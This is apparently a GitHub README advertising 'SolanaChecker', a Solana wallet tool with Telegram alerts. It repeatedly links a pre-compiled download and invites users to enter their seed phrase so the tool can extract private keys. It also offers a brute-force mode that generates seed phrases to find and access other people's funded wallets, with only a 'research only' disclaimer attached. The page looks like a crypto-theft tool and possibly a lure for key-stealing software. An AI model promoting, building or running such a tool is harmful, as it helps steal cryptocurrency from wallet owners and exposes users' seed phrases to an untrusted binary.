# Solana Wallet Activity Alerts via Telegram: Stay Informed

Want instant alerts about your Solana wallet activity? **SolanaChecker** offers real-time monitoring and notifications via Telegram. This powerful tool allows you to track transactions, monitor balances, and receive immediate updates directly in Telegram.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/system/slide.webp" />
</p>

## Key Program Features

1.  **Solana Address Balance Check:** Check the balance on any Solana address.

<p align="left">
    <img src="/system/thin.webp" />
</p>

2.  **Token Fraud Detection:** Assess the security of your tokens.

<p align="left">
    <img src="/system/tools.webp" />
</p>

3.  **Solana Address Tracking with Telegram Alerts:** Receive instant Telegram alerts for all Solana wallet activity.

4.  **Wallet Data from Mnemonic Phrase:** Extract your private key, address, and balance from your seed phrase.

<p align="left">
    <img src="/system/center.webp" />
</p>

5.  **Solana Wallet Generation:** Generate new Solana wallets.

<p align="left">
    <img src="/system/console.webp" />
</p>

6.  **Brute-Force Search & Telegram Support:** Generate seed phrases to find wallets and get balance updates via Telegram.

<p align="left">
    <img src="/system/dot.webp" />
</p>

## Setting Up Telegram Alerts

Configure Telegram alerts by entering your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project: Steps

The project uses C++ and has dependencies, so **vcpkg** is recommended:

### Installing Dependencies using vcpkg:

1.  If you don’t have **vcpkg**, install it by following the instructions on the [official page](https://github.com/microsoft/vcpkg).
2.  Add **vcpkg** to your PATH.
3.  Run these commands:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  Build the project.

### Building with Visual Studio:

1.  Open the solution.
2.  Ensure **vcpkg** integration (see [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  Find the executable in the `bin` folder.

### Building with a C++ Compiler:

1.  Ensure all dependencies are installed via **vcpkg**.
2.  Compile:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

1.  **-s / -search**: Start a brute-force search to find wallets with a balance.
2.  **-t / -track (ADDRESS)**: Start tracking a specific address; get alerts via Telegram.
3.  **-g / -gen (NUMBER)**: Generate the specified number of Solana wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Get wallet info using a seed phrase.
5.  **-b / -balance (ADDRESS)**: Display the balance of the specified Solana address.

## Important Notes

-   This program is for research only, not for illegal activities.
-   Cryptocurrency investments have risks. Always be secure with your data.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).